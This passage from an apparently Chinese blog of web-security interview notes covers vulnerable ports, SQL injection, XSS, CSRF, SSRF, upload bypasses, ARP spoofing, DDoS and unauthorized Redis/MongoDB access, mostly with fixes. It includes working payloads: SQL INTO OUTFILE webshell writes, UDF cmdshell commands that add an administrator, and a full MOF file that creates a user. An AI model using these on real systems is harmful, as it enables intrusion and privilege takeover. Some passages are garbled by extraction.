kangle主机管理系统登陆</span><br><span class="line"></span><br><span class="line">3389 远程桌⾯</span><br><span class="line"></span><br><span class="line">4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹</span><br><span class="line"></span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">5900 vnc </span><br><span class="line"></span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line"></span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作为代理进⼊内⽹</span><br><span class="line"></span><br><span class="line">6379 redis未授权</span><br><span class="line"></span><br><span class="line">7001,7002 WebLogic默认弱⼝令，反序列</span><br><span class="line"></span><br><span class="line">7778 Kloxo主机控制⾯板登录</span><br><span class="line"></span><br><span class="line">8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上</span><br><span class="line"></span><br><span class="line">8080 tomcat&#x2F;WDCP主机管理系统，默认弱⼝令</span><br><span class="line"></span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"></span><br><span class="line">8083 Vestacp主机管理系统 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">8649 ganglia </span><br><span class="line"></span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端⼝</span><br><span class="line"></span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</span><br><span class="line"></span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</span><br><span class="line"></span><br><span class="line">11211 memcache未授权访问</span><br><span class="line"></span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line"></span><br><span class="line">28017 mongodb统计⻚⾯</span><br><span class="line"></span><br><span class="line">50000 SAP命令执⾏</span><br><span class="line"></span><br><span class="line">50070,50030 hadoop默认端⼝未授权访问 </span><br></pre></td></tr></table></figure><h3 id="三、深信服⼀⾯"><a href="#三、深信服⼀⾯" class="headerlink" title="三、深信服⼀⾯"></a>三、深信服⼀⾯</h3><p>了解哪些漏洞⽂件上传有哪些防护⽅式 </p><p>⽤什么扫描端⼝，⽬录 </p><p>如何判断注⼊ </p><p>注⼊有防护怎么办 </p><p>有没有写过 tamper </p><p>3306 1443 8080 是什么端⼝ </p><p>计算机⽹络从物理层到应⽤层 xxxx </p><p>有没有 web 服务开发经验 </p><p>如何向服务器写⼊ webshell </p><p>有没有⽤过 xss 平台 </p><p>⽹站渗透的流程 </p><p>mysql 两种提权⽅式（udf，？）</p><p>常⻅加密⽅式 xxx </p><p>ddos 如何防护 </p><p>有没有抓过包，会不会写 wireshark 过滤规则 </p><p>清理⽇志要清理哪些 </p><h4 id="四、SQL-注⼊防护"><a href="#四、SQL-注⼊防护" class="headerlink" title="四、SQL 注⼊防护"></a>四、SQL 注⼊防护</h4><p>1、使⽤安全的 API </p><p>2、对输⼊的特殊字符进⾏ Escape 转义处理 </p><p>3、使⽤⽩名单来规范化输⼊验证⽅法 </p><p>4、对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p><p>5、服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p><p>6、规范编码, 字符集 </p><h4 id="五、为什么参数化查询可以防⽌-SQL-注⼊"><a href="#五、为什么参数化查询可以防⽌-SQL-注⼊" class="headerlink" title="五、为什么参数化查询可以防⽌ SQL 注⼊"></a>五、为什么参数化查询可以防⽌ SQL 注⼊</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套 </p><p>⽤参数运⾏ </p><p>简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语 义跑</p><h4 id="六、SQL-头注⼊点"><a href="#六、SQL-头注⼊点" class="headerlink" title="六、SQL 头注⼊点"></a>六、SQL 头注⼊点</h4><p>UA</p><p>REFERER</p><p>COOKIE</p><p>IP</p><h4 id="七、盲注是什么？怎么盲注？"><a href="#七、盲注是什么？怎么盲注？" class="headerlink" title="七、盲注是什么？怎么盲注？"></a>七、盲注是什么？怎么盲注？</h4><p>盲注是在 SQL 注⼊攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注 </p><p>⼊和利⽤的⽅式。盲注的⼿段有两种，⼀个是通过⻚⾯的返回内容是否正确 (boolean-based)，来验证是否存在注⼊。</p><p>⼀个是通过 sql 语句处理时间的不同来判断是否存在注⼊ (time-based)，在这⾥，可以⽤ benchmark，sleep 等造成延 </p><p>时效果的函数，也可以通过构造⼤笛卡⼉积的联合查询表来达到延时的⽬的。 </p><h4 id="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"><a href="#⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理" class="headerlink" title="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"></a>⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理</h4><p>在数据库使⽤了宽字符集⽽ WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中⽐如 </p><p>addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进⾏转义，因此 0xbf27 会变成 0xbf5c27, ⽽数据进⼊</p><p>数据库中时，由于 0XBF5C 是⼀个另外的字符，因此 \ 转义符号会被前⾯的 bf 带着 “吃掉”，单引号由此逃逸出来可以 </p><p>⽤来闭合语句。 </p><p>2、在哪⾥编码 </p><p>3、根本原因 </p><p>character_set_client(客户端的字符集) 和 character_set_connection(连接层的字符集) 不同, 或转换函数如，iconv、 </p><p>mb_convert_encoding 使⽤不当。 </p><p>4、解决办法 </p><p>统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为 UTF-8。或对数据进⾏正确的转 </p><p>义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。 </p><p>5、SQL ⾥⾯只有 update 怎么利⽤ </p><p>先理解这句 SQL</p><p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’$id’</p><p>如果此 SQL 被修改成以下形式，就实现了注⼊ </p><p>a、修改 homepage 值为 <a href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3</p><p>之后 SQL 语句变为UPDATE user SET password=’mypass’, homepage=’<a href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3’ WHERE id=’$id’</p><p>userlevel 为⽤户级别 </p><p>b、修改 password 值为 mypass)’ WHERE username=’admin’#</p><p>之后 SQL 语句变为</p><p>UPDATE user SET password=’MD5(mypass)’ WHERE username=’admin’#)’, homepage=’$homepage’ WHERE id=’$id’</p><p>c、修改 id 值为 ‘ OR username=’admin’ 之后 SQL 语句变为</p><p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’’ OR username=’admin’</p><h4 id="九、SQL-如何写-shell-单引被过滤怎么办"><a href="#九、SQL-如何写-shell-单引被过滤怎么办" class="headerlink" title="九、SQL 如何写 shell / 单引被过滤怎么办"></a>九、SQL 如何写 shell / 单引被过滤怎么办</h4><p>写 shell: root 权限，GPC 关闭，知道⽂件路径 outfifile 函数</p><p>`<a href="http://127.0.0.1:81/sqli.php?id=1">http://127.0.0.1:81/sqli.php?id=1</a> into outfile ‘C:\wamp64\www\phpinfo.php’ FIELDS TERMINATED BY ‘&lt;?php phpinfo</p><p>(); ?&gt;’`</p><p>`<a href="http://127.0.0.1:81/sqli.php?id=-1">http://127.0.0.1:81/sqli.php?id=-1</a> union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile ‘C:\w</p><p>amp64\www\phpinfo.php’`</p><p>宽字节注⼊ </p><p>1、代替空格的⽅法</p><p>%0a、%0b、%a0 等</p><p>/**/ 等注释符</p><p>&lt;&gt;</p><p>2、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别 </p><p>5 0 以下没有 information schema 这个系统表 ⽆法列表名等 只能暴⼒跑表名。5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p><p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操做。 </p><h4 id="⼗、XSS"><a href="#⼗、XSS" class="headerlink" title="⼗、XSS"></a>⼗、XSS</h4><p>1、XSS 原理 </p><p>反射型 </p><p>⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。需要诱使⽤户 “点击” ⼀个恶意链接，才能攻击 </p><p>成功</p><p>存储型 </p><p>存储型 XSS 会把⽤户输⼊的数据 “存储” 在服务器端。这种 XSS 具有很强的稳定性。 </p><p>DOM 型</p><p>通过修改⻚⾯的 DOM 节点形成的 XSS，称之为 DOM Based XSS。 </p><p>2、DOM 型和反射型的区别 </p><p>反射型 XSS：通过诱导⽤户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 </p><p>payload 的链接时⻚⾯应该是会带有特定的畸形数据的。DOM 型：通过修改⻚⾯的 DOM 节点形成的 XSS。DOM- </p><p>based XSS 由于是通过 js 代码进⾏ dom 操作产⽣的 XSS，所以在请求的响应中我们甚⾄不⼀定会得到相应的畸形数 </p><p>据。根本区别在我看来是输出点的不同。 </p><p>3、DOM 型和 XSS ⾃动化测试或⼈⼯测试 </p><p>⼈⼯测试思路：找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript: </p><p>后内容、eval、setTimeout 、setInterval 等直接执⾏之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经 </p><p>过安全函数。⾃动化测试参看道哥的博客，思路是从输⼊⼊⼿，观察变量传递的过程，最终检查是否有在危险函数输 </p><p>出，中途是否有经过安全函数。但是这样就需要有⼀个 javascript 解析器，否则会漏掉⼀些通过 js 执⾏带⼊的部分内</p><p>容容。</p><p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进⾏检测，对不同 </p><p>类型的 XSS 检测⽅式实际上并没有太过细分的标准化检测⽅式，所以回答的很烂。。。</p><p>4、如何快速发现 XSS 位置 </p><p>5、对于 XSS 怎么修补建议 </p><p>输⼊点检查：对⽤户输⼊的数据进⾏合法性检查，使⽤ fifilter 过滤敏感字符或对进⾏编码转义，针对特定类型数据进⾏格 </p><p>式检查。针对输⼊点的检查最好放在服务器端实现。 </p><p>输出点检查：对变量输出到 HTML ⻚⾯中时，对输出内容进⾏编码转义，输出在 HTML 中时，对其进⾏ </p><p>HTMLEncode，如果输出在 Javascript 脚本中时，对其进⾏ JavascriptEncode。对使⽤ JavascriptEncode 的变量都放 </p><p>在引号中并转义危险字符，data 部分就⽆法逃逸出引号外成为 code 的⼀部分。还可以使⽤更加严格的⽅法，对所有数</p><p>字字⺟之外的字符都使⽤⼗六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的</p><p>⽅式也需要考虑清楚，针对不同的输出点，我们防御 XSS 的⽅法可能会不同，这点可能在之后的⽂章会做下总结。 </p><p>除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。 </p><p>6、XSS 蠕⾍的⽣产条件 </p><p>正常情况下，⼀个是产⽣ XSS 点的⻚⾯不属于 self ⻚⾯，⽤户之间产⽣交互⾏为的⻚⾯，都可能造成 XSS Worm 的产 </p><p>⽣。</p><p>不⼀定需要存储型 XSS </p><h4 id="⼗⼀、CSRF"><a href="#⼗⼀、CSRF" class="headerlink" title="⼗⼀、CSRF"></a>⼗⼀、CSRF</h4><p>1、CSRF 原理 </p><p>CSRF 是跨站请求伪造攻击，由客户端发起, 是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认 </p><p>2、防御验证 Referer </p><p>添加 token </p><p>3、token 和 referer 做横向对⽐，谁安全等级⾼？ </p><p>token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并 </p><p>且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则) </p><p>4、对 referer 的验证，从什么⻆度去做？如果做，怎么杜绝问题</p><p>对 header 中的 referer 的验证，⼀个是空 referer，⼀个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的 </p><p>⽩名单中，正则规则应当写完善。 </p><p>5、针对 token, 对 token 测试会注意哪⽅⾯被⼈，会对 token 的哪⽅⾯进⾏测试？ </p><p>引⽤⼀段请教前辈的回答： </p><p>针对token的攻击，⼀是对它本身的攻击，重放测试⼀次性、分析加密规则、校验⽅式是否正确等，⼆是结合信息泄露漏洞对它的获取，结合着发起组合攻击 </p><p>信息泄露有可能是缓存、⽇志、get，也有可能是利⽤跨站 </p><p>很多跳转登录的都依赖token，有⼀个跳转漏洞加反射型跨站就可以组合成登录劫持了 </p><p>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过⽐如抢红包业务之类的 </p><h4 id="⼗二、SSRF"><a href="#⼗二、SSRF" class="headerlink" title="⼗二、SSRF"></a>⼗二、SSRF</h4><p>SSRF(Server-Side Request Forgery: 服务器端请求伪造) 是⼀种由攻击者构造形成由服务端发起请求的⼀个安全漏洞。 </p><p>⼀般情况下，SSRF 攻击的⽬标是从外⽹⽆法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它 </p><p>相连⽽与外⽹隔离的内部系统） </p><p>SSRF 形成的原因⼤都是由于服务端提供了从其他服务器应⽤获取数据的功能且没有对⽬标地址做过滤与限制。⽐如从指 </p><p>定 URL 地址获取⽹⻚⽂本内容，加载指定地址的图⽚，下载等等。 </p><p>1、监测SSRF 漏洞的验证⽅法： </p><p>1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送 </p><p>的，从⽽来判断是否存在 SSRF 漏洞 </p><p>2）在⻚⾯源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存">www.baidu.com/xxx.php?image=（地址）的就可能存</a> 在 SSRF 漏洞 </p><p>2、SSRF 漏洞的成因 防御 绕过 </p><p>成因：模拟服务器对其他服务器资源进⾏请求，没有做合法性验证。利⽤：构造恶意内⽹ IP 做探测，或者使⽤其余所⽀ </p><p>持的协议对其余服务进⾏攻击。防御：禁⽌跳转，限制协议，内外⽹限制，URL 限制。绕过：使⽤不同协议，针对 IP， </p><p>IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转 + dns rebindding。 </p><h4 id="⼗三、上传"><a href="#⼗三、上传" class="headerlink" title="⼗三、上传"></a>⼗三、上传</h4><h5 id="1、⽂件上传漏洞原理"><a href="#1、⽂件上传漏洞原理" class="headerlink" title="1、⽂件上传漏洞原理"></a>1、⽂件上传漏洞原理</h5><p>由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动 </p><p>态脚本⽂件 </p><h5 id="2、常⻅的上传绕过⽅式"><a href="#2、常⻅的上传绕过⽅式" class="headerlink" title="2、常⻅的上传绕过⽅式"></a>2、常⻅的上传绕过⽅式</h5><p>前端 js 验证：禁⽤ js/burp 改包 </p><p>⼤⼩写 </p><p>双重后缀名 </p><p>过滤绕过 pphphp-&gt;php </p><h5 id="3、防护⽂件上传⽬录设置为不可执⾏"><a href="#3、防护⽂件上传⽬录设置为不可执⾏" class="headerlink" title="3、防护⽂件上传⽬录设置为不可执⾏"></a>3、防护⽂件上传⽬录设置为不可执⾏</h5><p>使⽤⽩名单判断⽂件上传类型 </p><p>⽤随机数改写⽂件名和路径 </p><h5 id="4、审查上传点的元素有什么意义？"><a href="#4、审查上传点的元素有什么意义？" class="headerlink" title="4、审查上传点的元素有什么意义？"></a>4、审查上传点的元素有什么意义？</h5><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p><h4 id="⼗四、⽂件包含"><a href="#⼗四、⽂件包含" class="headerlink" title="⼗四、⽂件包含"></a>⼗四、⽂件包含</h4><h5 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h5><p>引⼊⼀段⽤户能控制的脚本或代码，并让服务器端执⾏ include() 等函数通过动态变量的⽅式引⼊需要包含的⽂件； </p><p>⽤户能够控制该动态变量。 </p><h5 id="2、导致⽂件包含的函数"><a href="#2、导致⽂件包含的函数" class="headerlink" title="2、导致⽂件包含的函数"></a>2、导致⽂件包含的函数</h5><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), … JSP/Servlet：ava.io.File(), </p><p>java.io.Fil-eReader(), … ASP：include fifile, include virtual, </p><h5 id="3、本地⽂件包含"><a href="#3、本地⽂件包含" class="headerlink" title="3、本地⽂件包含"></a>3、本地⽂件包含</h5><p>能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞 </p><h4 id="⼗五、逻辑漏扫"><a href="#⼗五、逻辑漏扫" class="headerlink" title="⼗五、逻辑漏扫"></a>⼗五、逻辑漏扫</h4><h5 id="1、⾦融⾏业常⻅逻辑漏洞"><a href="#1、⾦融⾏业常⻅逻辑漏洞" class="headerlink" title="1、⾦融⾏业常⻅逻辑漏洞"></a>1、⾦融⾏业常⻅逻辑漏洞</h5><p>单针对⾦融业务的 主要是数据的篡改 (涉及⾦融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅⽺ </p><p>⽑，交易 / 订单信息泄露，⽔平越权对别⼈的账户查看或恶意操作，交易或业务步骤绕过。 </p><h4 id="⼗五、中间⼈攻击"><a href="#⼗五、中间⼈攻击" class="headerlink" title="⼗五、中间⼈攻击"></a>⼗五、中间⼈攻击</h4><p>中间 攻 （缺 ） 的攻 客户 与 务 之间在 的 中缺 造成的中间⼈攻击是⼀个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握⼿的过程中缺乏相互认证⽽造成的漏洞 </p><p>防御中间⼈攻击的⽅案通常基于⼀下⼏种技术 </p><ol><li>公钥基础建设 PKI 使⽤ PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例⼦中都是只验证服务 </li></ol><p>器，这样就造成了 SSL 握⼿环节的漏洞，⽽如果使⽤相互认证的的话，基本可以更强⼒的相互认证</p><ol start="2"><li>延迟测试 </li></ol><p>使⽤复杂加密哈希函数进⾏计算以造成数⼗秒的延迟；如果双⽅通常情况下都要花费 20 秒来计算，并且整个通讯花费 </p><p>了 60 秒计算才到达对⽅，这就能表明存在第三⽅中间⼈。 </p><ol start="3"><li>使⽤其他形式的密钥交换形式</li></ol><h5 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h5><p>原理</p><p>每台主机都有⼀个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，⽽局域⽹数据传输依靠的是 MAC</p><p>地址。在 ARP 缓存表机制存在⼀个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证⾃⼰是否向对⽅主机发送过</p><p>ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关 </p><p>系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 </p><p>防护</p><ol><li><p>在主机绑定⽹关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s ⽹关 IP ⽹关 MAC </p></li><li><p>在⽹关绑定主机 MAC 与 IP 地址</p></li><li><p>使⽤ ARP 防⽕墙 </p></li></ol><h4 id="⼗六、DDOS1、DDOS-原理"><a href="#⼗六、DDOS1、DDOS-原理" class="headerlink" title="⼗六、DDOS1、DDOS 原理"></a>⼗六、DDOS1、DDOS 原理</h4><p>利⽤合理的请求造成资源过载，导致服务不可⽤ </p><h5 id="syn-洪流的原理"><a href="#syn-洪流的原理" class="headerlink" title="syn 洪流的原理"></a>syn 洪流的原理</h5><p>伪造⼤量的源 IP 地址，分别向服务器端发送⼤量的 SYN 包，此时服务器端会返回 SYN/ACK 包，因为源地址是伪造 </p><p>的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3～5 次并且等待⼀个 SYNTime（⼀般为 </p><p>30 秒⾄ 2 分钟），如果超时则丢弃这个连接。攻击者⼤量发送这种伪造源地址的 SYN 请求，服务器端将会消耗⾮常多 </p><p>的资源（CPU 和内存）来处理这种半连接，同时还要不断地对这些 IP 进⾏ SYN+ACK 重试。最后的结果是服务器⽆暇 </p><p>理睬正常的连接请求，导致拒绝服务。 </p><h5 id="CC-攻击原理"><a href="#CC-攻击原理" class="headerlink" title="CC 攻击原理"></a>CC 攻击原理</h5><p>对⼀些消耗资源较⼤的应⽤⻚⾯不断发起正常的请求，以达到消耗服务端资源的⽬的。 </p><p>2、DOSS 防护 </p><p>SYN Cookie/SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每⼀个 IP 地址分配⼀个 “Cookie”，并统计每 </p><p>个 IP 地址的访问频率。如果在短时间内收到⼤量的来⾃同⼀个 IP 地址的数据包，则认为受到攻击，之后来⾃这个 IP 地 </p><p>址的包将被丢弃。 </p><h4 id="⼗七、提权"><a href="#⼗七、提权" class="headerlink" title="⼗七、提权"></a>⼗七、提权</h4><p>MySQL 两种提权⽅式 </p><p>udf 提权, mof 提权 </p><p>MySQL_UDF 提取 </p><p>要求: 1. ⽬标系统是 Windows(Win2000,XP,Win2003)；2. 拥有 MYSQL 的某个⽤户账号，此账号必须有对 mysql 的 </p><p>insert 和 delete 权限以创建和抛弃函数 3. 有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll ⽂件放到 </p><p>安装⽬录 的 \ ⽂件夹 才能创建⾃定义函数 以再 ⾥输⼊MYSQL 安装⽬录下的 lib\plugin ⽂件夹下才能创建⾃定义函数 可以再 mysql ⾥输⼊ select @@basedir show variables</p><p>like ‘%plugins%’ 寻找 mysql 安装路径 提权: </p><p>使⽤ SQL 语句创建功能函数。语法：Create Function 函数名（函数名只能为下⾯列表中的其中之⼀）returns string </p><p>soname ‘导出的 DLL 路径’；</p><p>create function cmdshell returns string soname ‘udf.dll’</p><p>select cmdshell(‘net user arsch arsch /add’);</p><p>select cmdshell(‘net localgroup administrators arsch /add’);</p><p>drop function cmdshell;</p><p>该⽬录默认是不存在的，这就需要我们使⽤ webshell 找到 MYSQL 的安装⽬录，并在安装⽬录下创建 lib\plugin ⽂件 </p><p>夹，然后将 udf.dll ⽂件导出到该⽬录即可。 </p><p>MySQL mof 提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line"></span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line"></span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line"></span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line"></span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line"></span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line"></span><br><span class="line">ScriptText &#x3D;</span><br><span class="line"></span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn &#x2F;add\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;instance of __FilterToConsumerBinding</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line"></span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的第 18 ⾏的命令，上传前请⾃⼰更改。 </p><p>2、执⾏ load_fifile 及 into dumpfifile 把⽂件导出到正确的位置即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#39;c:&#x2F;wmpub&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mov&#39;</span><br></pre></td></tr></table></figure><p>执⾏成功后，即可添加⼀个普通⽤户，然后你可以更改命令，再上传导出执⾏把⽤户提升到管理员权限，然后 3389 连 </p><p>接之就 ok 了。 </p><h4 id="⼗⼋、特殊漏洞"><a href="#⼗⼋、特殊漏洞" class="headerlink" title="⼗⼋、特殊漏洞"></a>⼗⼋、特殊漏洞</h4><p>1、Struts2-045 </p><p>2、Redis 未授权 </p><p>产⽣原因 </p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公⽹上，如果在没有开启认证的情况下，可 </p><p>以导致任意⽤户在可以访问⽬标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis </p><p>的情况下可以利⽤ Redis 的相关⽅法，可以成功在 Redis 服务器上写⼊公钥，进⽽可以使⽤对应私钥直接登录⽬标服务 </p><p>器</p><p>利⽤条件和⽅法 </p><p>条件: </p><p>a、redis 服务以 root 账户运⾏ </p><p>b、redis ⽆密码或弱密码进⾏认证c、redis 监听在 0.0.0.0 公⽹上 </p><p>⽅法: </p><p>a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 </p><p>b、上传 SSH 公钥获得 SSH 登录权限 </p><p>c、通过 crontab 反弹 shell </p><p>d、slave 主从模式利⽤ </p><p>修复</p><p>密码验证 </p><p>降权运⾏ </p><p>限制 ip / 修改端⼝ </p><p>3、Jenkins 未授权访问 </p><p>4、MongoDB 未授权访问 </p><p>攻击者通过未授权访问进⼊脚本命令执⾏界⾯执⾏攻击指令</p><p>println “ifconfig -a”.execute().text 执⾏⼀些系统命令, 利⽤ wget 下载 webshell </p><p>开启 MongoDB 服务时不添加任何参数时, 默认是没有权限验证的, ⽽且可以远程访问数据库，登录的⽤户可以通过默认 </p><p>端⼝⽆需密码对数据库进⾏增、删、改、查等任意⾼危操作。 </p><p>防护</p><p>为 MongoDB 添加认证：1)MongoDB 启动时添加–auth 参数 2) 给 MongoDB 添加⽤户：use admin #使⽤ admin 库 </p><p>db.addUser(“root”, “123456”) #添加⽤户名 root 密码 123456 的⽤户 db.auth(“root”,“123456”) #验证下是否添加成 </p><p>功，返回 1 说明成功 2、禁⽤ HTTP 和 REST 端⼝ MongoDB ⾃身带有⼀个 HTTP 服务和并⽀持 REST 接⼝。在 2.6 </p><p>以后这些接⼝默认是关闭的。mongoDB 默认会使⽤默认端⼝监听 web 服务，⼀般不需要通过 web ⽅式进⾏远程管理，建议禁⽤。修改配置⽂件或在启动的时候选择–nohttpinterface 参数 nohttpinterface=false 3、限制绑定 IP 启动时加⼊</p><p>参数 –bind_ip 127.0.0.1 或在 / etc/mongodb.conf ⽂件中添加以下内容：bind_ip = 127.0.0.1 </p><p>5、Memcache 未授权访问 </p><p>Memcached 是⼀套常⽤的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公⽹开放的 Memcache 服务很 </p><p>容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。 </p><p>利⽤</p><p>a、登录机器执⾏ netstat -an |more 命令查看端⼝监听情况。回显 0.0.0.0:11211 表示在所有⽹卡进⾏监听，存在 </p><p>memcached 未授权访问漏洞。 </p><p>b、telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在 </p><p>漏洞加固 </p><p>a、设置 memchached 只允许本地访问 b、禁⽌外⽹访问 Memcached 11211 端⼝ c、编译时加上–enable-sasl，启⽤ </p><p>SASL 认证</p><p>6、FFMPEG 本地⽂件读取 </p><p>原理</p><p>通过调⽤加密 API 将 payload 加密放⼊⼀个会被执⾏的段字节中。但是具体回答⼯程中我只回答道了 SSRF ⽼洞， </p><p>m3u8 头，偏移量，加密。 </p><h4 id="⼗九、安全知识"><a href="#⼗九、安全知识" class="headerlink" title="⼗九、安全知识"></a>⼗九、安全知识</h4><p>1、WEB </p><p>常⻅ 